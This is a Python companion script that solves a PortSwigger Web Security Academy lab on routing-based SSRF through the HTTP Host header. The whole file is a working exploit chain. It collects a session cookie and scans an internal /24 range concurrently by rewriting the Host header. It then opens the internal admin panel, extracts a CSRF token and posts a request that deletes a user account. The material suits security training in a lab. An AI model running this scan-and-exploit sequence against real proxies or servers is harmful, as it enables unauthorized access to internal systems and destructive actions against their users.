#!/usr/bin/env python3
"""
Routing-based SSRF
PortSwigger Web Security Academy -- HTTP Host Header Attacks

Companion script for the writeup: 04-routing-based-ssrf.md

What this does:
    Collects a session cookie from a normal homepage visit (required --
    a modified Host with no cookie returns 403 regardless of the address),
    then sweeps 192.168.0.0/24 concurrently with the Host header set to each
    candidate IP. 504 Gateway Timeout means the proxy routed the request but
    nothing answered; anything else (302/200) means we found a live internal
    backend. Once found, it requests /admin at that Host to grab a CSRF
    token, then posts a delete for carlos through the same Host-routed path.

Usage:
    python 04-routing-based-ssrf.py <lab-url>
    e.g. python 04-routing-based-ssrf.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
from concurrent.futures import ThreadPoolExecutor
from typing import Optional

import httpx


def solve(lab_url: str) -> None:
    client = httpx.Client(verify=False, timeout=10, follow_redirects=False)

    print("[*] Getting session cookies from a normal homepage visit...")
    client.get(lab_url)
    cookies = dict(client.cookies)
    print(f"[*] Cookies: {list(cookies.keys())}")

    print("[*] Scanning 192.168.0.0/24 via the Host header (20 concurrent workers)...")

    def try_ip(octet: int) -> Optional[str]:
        ip = f"192.168.0.{octet}"
        try:
            r = httpx.get(
                f"{lab_url}/",
                headers={"Host": ip},
                cookies=cookies,
                follow_redirects=False,
                verify=False,
                timeout=5,
            )
        except Exception:
            return None
        # 504 = proxy routed but nothing listened; 403 = blocked without cookies.
        # Anything else means a live backend answered.
        if r.status_code not in (504, 403):
            print(f"  [+] Hit: {ip} -> {r.status_code}")
            return ip
        return None

    found = None
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(try_ip, i): i for i in range(0, 256)}
        for future in futures:
            result = future.result()
            if result:
                found = result

    if not found:
        print("[-] No internal host responded in 192.168.0.0/24.")
        return
    print(f"[+] Internal admin host: {found}")

    print("[*] Accessing /admin via Host header...")
    r = httpx.get(
        f"{lab_url}/admin",
        headers={"Host": found},
        cookies=cookies,
        follow_redirects=True,
        verify=False,
        timeout=10,
    )
    print(f"[*] /admin status: {r.status_code}, len={len(r.text)}")

    csrf_m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = csrf_m.group(1) if csrf_m else ""
    if not csrf:
        print("[-] No CSRF token found on the admin panel.")
        return
    print(f"[*] CSRF: {csrf[:20]}...")

    print("[*] Deleting carlos...")
    r = httpx.post(
        f"{lab_url}/admin/delete",
        headers={"Host": found},
        cookies=cookies,
        data={"username": "carlos", "csrf": csrf},
        follow_redirects=True,
        verify=False,
        timeout=10,
    )
    print(f"[*] Delete status: {r.status_code}")

    if "Congratulations" in r.text:
        print("[+] Lab solved -- carlos deleted via routing-based SSRF.")
    else:
        check = client.get(lab_url)
        if "Congratulations" in check.text:
            print("[+] Lab solved -- carlos deleted via routing-based SSRF.")
        else:
            print("[-] Not solved yet -- inspect the delete response.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
